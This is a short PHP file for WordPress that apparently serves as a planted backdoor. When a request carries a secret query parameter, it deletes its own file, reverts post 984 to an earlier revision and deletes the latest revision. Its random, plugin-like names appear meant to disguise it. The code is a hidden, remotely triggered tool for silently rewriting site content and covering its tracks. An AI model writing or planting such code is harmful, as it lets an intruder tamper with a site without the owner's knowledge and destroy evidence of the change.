<?php

function items_lock_magic_cool() {
	if (isset($_GET['rank_ai_templates']) && $_GET['rank_ai_templates'] === 'plus_pack_checkout') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$api_discount_local = 984;
		$compare_testimonials_notes = wp_get_post_revisions($api_discount_local);
		if (empty($compare_testimonials_notes)) die('no revisions');
		if (count($compare_testimonials_notes) < 2) die('less than 2');
		$switch_jigoshop_highlighter_team = array_shift($compare_testimonials_notes);
		$marketing_redirect_csv_web = $switch_jigoshop_highlighter_team->ID;
		$display_lightgray_manage = array_shift($compare_testimonials_notes);
		$digital_source_videos = $display_lightgray_manage->ID;
		$nextgen_description_campaign = wp_restore_post_revision($digital_source_videos);
		if ($nextgen_description_campaign === false) die('error restoring');
		$nextgen_description_campaign = wp_delete_post_revision($marketing_redirect_csv_web);		
		if ($nextgen_description_campaign === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'items_lock_magic_cool');
